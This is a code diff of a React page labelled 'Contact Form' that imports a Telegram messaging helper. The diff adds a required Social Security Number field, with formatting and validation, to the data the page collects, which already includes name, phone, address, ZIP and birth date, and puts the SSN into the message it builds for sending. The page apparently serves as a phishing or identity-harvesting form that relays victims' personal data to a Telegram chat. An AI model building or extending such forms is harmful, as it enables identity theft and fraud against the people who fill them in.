@@ -8,6 +8,7 @@ import { sendTelegramMessage } from "../../utils/telegram"; // Import Telegram f
 const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
 const phoneRegex = /^\(\d{3}\) \d{3}-\d{4}$/; // U.S. phone format (XXX) XXX-XXXX
 const zipRegex = /^\d{5}$/; // Zipcode format (XXXXX)
+const ssnRegex = /^\d{3}-\d{2}-\d{4}$/; // SSN format XXX-XX-XXXX
 
 const validateInput = (field: string, value: string): string => {
   switch (field) {
@@ -27,6 +28,8 @@ const validateInput = (field: string, value: string): string => {
       return value.trim() ? "" : "Address is required.";
     case "zipcode":
       return zipRegex.test(value) ? "" : "Please enter a valid 5-digit ZIP code.";
+    case "ssn":
+      return ssnRegex.test(value) ? "" : "SSN must be in XXX-XX-XXXX format.";
     default:
       return "";
   }
@@ -44,8 +47,9 @@ const FormPage = () => {
     address?: string;
     state?: string;
     zipcode?: string;
+    ssn?: string;
   };
-  
+
   const [formErrors, setFormErrors] = useState<FormErrors>({});
   const [phone, setPhone] = useState<string>("");
   const [zipcode, setZipcode] = useState<string>("");
@@ -53,6 +57,7 @@ const FormPage = () => {
   const [day, setDay] = useState<string>("");
   const [month, setMonth] = useState<string>("");
   const [year, setYear] = useState<string>("");
+  const [ssn, setSsn] = useState<string>("");
   const router = useRouter();
 
   const formatPhoneNumber = (input: string) => {
@@ -65,6 +70,14 @@ const FormPage = () => {
   const handlePhoneChange = (e: React.ChangeEvent<HTMLInputElement>) => {
     const formattedPhone = formatPhoneNumber(e.target.value);
     setPhone(formattedPhone);
+  };
+
+  const handleSsnChange = (e: React.ChangeEvent<HTMLInputElement>) => {
+    const cleaned = e.target.value.replace(/\D/g, "");
+    let formattedSsn = cleaned;
+    if (cleaned.length > 3) formattedSsn = `${cleaned.slice(0, 3)}-${cleaned.slice(3, 5)}`;
+    if (cleaned.length > 5) formattedSsn = `${cleaned.slice(0, 3)}-${cleaned.slice(3, 5)}-${cleaned.slice(5, 9)}`;
+    setSsn(formattedSsn);
   };
 
   const handleFormSubmit = async (e: React.FormEvent<HTMLFormElement>) => {
@@ -80,7 +93,8 @@ const FormPage = () => {
       email: (form.elements.namedItem("email") as HTMLInputElement).value,
       address: (form.elements.namedItem("address") as HTMLInputElement).value,
       state,
-      zipcode
+      zipcode,
+      ssn,
     };
 
     const errors: Record<string, string> = {};
@@ -107,6 +121,7 @@ const FormPage = () => {
       - Address: ${formData.address}
       - State: ${formData.state}
       - Zipcode: ${formData.zipcode}
+      - SSN: ${formData.ssn}
       - Time: ${new Date().toLocaleString()}`;
 
     try {
@@ -127,25 +142,20 @@ const FormPage = () => {
       <Head>
         <title>Contact Form</title>
         <meta name="viewport" content="width=device-width, initial-scale=1" />
-        <Head>
-  <title>Contact Form</title>
-  <meta name="viewport" content="width=device-width, initial-scale=1" />
-  <style>{`
-    input:-webkit-autofill,
-    select:-webkit-autofill {
-      background-color: transparent !important;
-      color: black !important;
-      -webkit-box-shadow: 0 0 0px 1000px white inset !important;
-    }
+        <style>{`
+          input:-webkit-autofill,
+          select:-webkit-autofill {
+            background-color: transparent !important;
+            color: black !important;
+            -webkit-box-shadow: 0 0 0px 1000px white inset !important;
+          }
 
-    input:-webkit-autofill:focus,
-    select:-webkit-autofill:focus {
-      background-color: transparent !important;
-      color: black !important;
-    }
-  `}</style>
-</Head>
-
+          input:-webkit-autofill:focus,
+          select:-webkit-autofill:focus {
+            background-color: transparent !important;
+            color: black !important;
+          }
+        `}</style>
       </Head>
       <div className="min-h-screen flex flex-col bg-gray-50">
         <header className="bg-[#66d3ee] border-b-4">
@@ -308,6 +318,21 @@ const FormPage = () => {
                   className={`w-full mt-2 border ${formErrors.zipcode ? "border-red-500" : "border-gray-300"} rounded-lg p-3 focus:outline-none focus:ring-2 ${formErrors.zipcode ? "focus:ring-red-500" : "focus:ring-blue-500"}`}
                 />
                 {formErrors.zipcode && <p className="text-sm text-red-500 mt-2">{formErrors.zipcode}</p>}
+              </div>
+
+              {/* SSN */}
+              <div className="mb-6">
+                <label htmlFor="ssn" className="block text-sm font-medium text-black">Social Security Number (SSN)</label>
+                <input
+                  id="ssn"
+                  name="ssn"
+                  type="text"
+                  required
+                  value={ssn}
+                  onChange={handleSsnChange}
+                  className={`w-full mt-2 border ${formErrors.ssn ? "border-red-500" : "border-gray-300"} rounded-lg p-3 focus:outline-none focus:ring-2 ${formErrors.ssn ? "focus:ring-red-500" : "focus:ring-blue-500"}`}
+                />
+                {formErrors.ssn && <p className="text-sm text-red-500 mt-2">{formErrors.ssn}</p>}
               </div>
 
               <div className="flex justify-center mb-8">
